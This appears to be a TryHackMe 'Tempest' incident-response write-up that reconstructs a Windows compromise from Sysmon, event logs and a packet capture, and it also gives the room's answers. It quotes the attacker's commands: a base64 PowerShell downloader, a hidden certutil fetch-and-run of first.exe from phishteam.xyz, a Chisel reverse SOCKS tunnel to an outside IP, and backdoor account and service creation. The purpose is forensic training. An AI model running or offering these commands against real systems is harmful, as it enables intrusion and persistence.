# 🔍 TryHackMe — Tempest Room Writeup
### Incident Response | Digital Forensics | Full Attack Chain Investigation

---

## 📋 Room Overview

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room Name** | Tempest |
| **Difficulty** | Hard |
| **Category** | Incident Response / Digital Forensics |
| **Focus** | Sysmon Logs, Windows Event Logs, PCAP Analysis |

> **Scenario:** Tasked as an Incident Responder to investigate a fully compromised Windows workstation. The goal is to analyse endpoint and network artefacts to reconstruct the full attack chain — from initial access to post-exploitation persistence.

---

## 🛠️ Toolset

### Endpoint Log Analysis
| Tool | Purpose |
|---|---|
| **EvtxEcmd** | Converts `.evtx` Windows event logs to CSV |
| **Timeline Explorer** | Loads CSV output, enables filtering and searching |
| **SysmonView** | Visualises Sysmon events as a process tree (uses XML export) |
| **Event Viewer** | Built-in Windows EVTX inspection |

### Network Log Analysis
| Tool | Purpose |
|---|---|
| **Wireshark** | Packet-level analysis of `.pcapng` capture |
| **Brim (Zui)** | Query-based HTTP traffic analysis over PCAP |

### Log Parsing Commands
```powershell
# Parse Sysmon EVTX to CSV
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv

# Verify file integrity
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```

---

## 🚨 Stage 1 — Initial Access: Malicious Document

### Summary
The attack chain began with a phishing `.doc` file delivered via Chrome. The document exploited **CVE-2022-30190 (Follina / MSDT)** to execute a PowerShell command without user interaction beyond opening the file.

### Findings

| Question | Answer |
|---|---|
| Malicious document name | `free_magicules.doc` |
| Compromised user & machine | `TEMPEST\benimaru` |
| WINWORD.EXE PID | `496` |
| CVE Exploited | **CVE-2022-30190** (Follina) |
| C2 Domain | `phishteam.xyz` |
| Resolved C2 IP | `167.71.199.191` |

### Methodology
- Filtered **Sysmon Event ID 1** (Process Create) in Timeline Explorer for `.doc` extension
- Cross-referenced with Event Viewer to confirm PID and user context
- Traced C2 domain via **Sysmon Event ID 22** (DNS Query) from the spawned process

### Base64 Encoded Payload
```
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAi
JGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3Ig
aHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA
7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0
ZS56aXA7Cg==
```
**Decoded (CyberChef):** Downloads `update.zip` from `phishteam.xyz`, extracts it to the Windows Startup folder for persistence.

---

## ⚙️ Stage 2 — Persistence & Second-Stage Execution

### Summary
The payload planted in the Startup folder executes on every user login via a hidden PowerShell command. It downloads and runs `first.exe` — the primary C2 implant — using `certutil` (LOLB abuse).

### Findings

| Question | Answer |
|---|---|
| Startup payload path | `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` |
| Login execution command | `powershell.exe -w hidden -noni certutil -urlcache -split -f http://phishteam.xyz/02dcf07/first.exe C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe` |
| `first.exe` SHA256 | `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8` |
| C2 domain & port | `resolvecyber.xyz:80` |

### Methodology
- Searched Timeline Explorer for `phishteam.xyz` to surface PowerShell commands
- Identified `certutil` LOLB abuse for binary download
- Cross-referenced Sysmon logs with Wireshark to confirm C2 domain and port

---

## 🌐 Network Traffic Analysis

### Summary
Using Brim, HTTP traffic was queried to reconstruct C2 communications. The C2 binary used Base64-encoded URIs to exfiltrate command output.

### Findings

| Question | Answer |
|---|---|
| Malicious payload URL | `http://phishteam.xyz/02dcf07/index.html` |
| C2 encoding | `base64` |
| C2 command output parameter | `q` |
| C2 command fetch URL | `/9ab62b5` |
| HTTP method | `GET` |
| Attacker's language | **Nim** (identified via User-Agent) |

### Brim Query Used
```
_path=="http" "resolvecyber.xyz" id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts
```

---

## 🔎 Discovery — Internal Reconnaissance

### Summary
The attacker used the C2 channel to run reconnaissance commands. Outputs were base64-encoded in URI parameters. Decoding revealed a plaintext password and open service ports.

### Findings

| Question | Answer |
|---|---|
| Discovered password | `infernotempest` |
| Remote shell port | `5985` (WinRM) |
| SOCKS proxy command | `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks` |
| Proxy tool (SHA256 lookup) | **Chisel** (`8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`) |
| Lateral movement service | **WinRM** (`wsmprovhost.exe -Embedding`) |

---

## 🔓 Privilege Escalation — PrintSpoofer

### Summary
With a WinRM foothold using harvested credentials, the attacker downloaded PrintSpoofer to exploit `SeImpersonatePrivilege` and escalate to SYSTEM.

### Findings

| Question | Answer |
|---|---|
| Escalation binary | `spf.exe` |
| spf.exe SHA256 | `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D` |
| Tool name | **PrintSpoofer** |
| Exploited privilege | `SeImpersonatePrivilege` |
| C2 binary at SYSTEM | `final.exe` |
| C2 port | `8080` |

---

## 🏴 Actions on Objective — Full Compromise

### Summary
With SYSTEM access, the attacker created backdoor accounts, added one to the Administrators group, and installed `final.exe` as an auto-start service for durable persistence.

### Findings

| Question | Answer |
|---|---|
| New accounts created | `shion`, `shuna` |
| Failed attempt reason | Missing `/add` flag in net user command |
| Account creation Event ID | **4720** |
| Admin group add command | `net localgroup administrators /add shion` |
| Sensitive group Event ID | **4732** |
| Persistence service | `sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto` |

---

## 🚩 Indicators of Compromise (IOCs)

### IP Addresses
```
167.71.199.191
167.71.222.162
```

### Domains
```
phishteam[.]xyz
resolvecyber[.]xyz
```

### URLs
```
hxxp[://]phishteam[.]xyz/02dcf07/update[.]zip
hxxp[://]phishteam[.]xyz/02dcf07/index[.]html
hxxp[://]phishteam[.]xyz/02dcf07/first[.]exe
```

### File Hashes (SHA256)
| File | Hash |
|---|---|
| `capture.pcapng` | `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6` |
| `sysmon.evtx` | `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F` |
| `windows.evtx` | `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60` |
| `first.exe` | `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8` |
| `ch.exe` (Chisel) | `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451` |
| `spf.exe` (PrintSpoofer) | `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D` |

---

## ✅ Skills Demonstrated

- 🔍 **DFIR** — End-to-end attack chain reconstruction from captured artefacts
- 📋 **Sysmon Analysis** — Event ID filtering, process correlation, DNS/file tracking
- 🪟 **Windows Event Log Analysis** — Account creation (4720), group changes (4732)
- 🌐 **Network Forensics** — Wireshark + Brim, HTTP C2 traffic decoding
- 🦠 **Behavioral Malware Analysis** — Base64 payload decoding, Nim C2 identification
- 🔑 **Privilege Escalation** — SeImpersonatePrivilege / PrintSpoofer exploitation chain
- 🛡️ **Threat Intel** — CVE-2022-30190 research, VirusTotal hash lookup
- ⚙️ **LOLB Detection** — certutil, PowerShell living-off-the-land abuse
- 🔒 **Persistence Detection** — Startup folder, Windows service creation

---

*Completed on TryHackMe | Room: Tempest | Category: Hard / Incident Response*
